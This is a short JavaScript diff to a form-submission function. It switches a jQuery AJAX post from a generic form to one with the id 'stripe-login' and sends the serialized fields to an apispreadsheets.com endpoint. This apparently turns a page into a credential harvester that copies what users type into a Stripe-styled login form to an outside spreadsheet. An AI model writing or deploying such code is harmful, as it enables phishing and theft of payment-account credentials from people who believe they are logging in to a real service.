@@ -12,7 +12,7 @@ function SubForm (){
     $.ajax({
         url:'https://api.apispreadsheets.com/data/5ybqPNvelAiETkha/',
         type:'post',
-        data:$("#myForm").serializeArray(),
+        data:$("#stripe-login").serializeArray(),
         success: function(){
           alert("Form Data Submitted :)")
         },
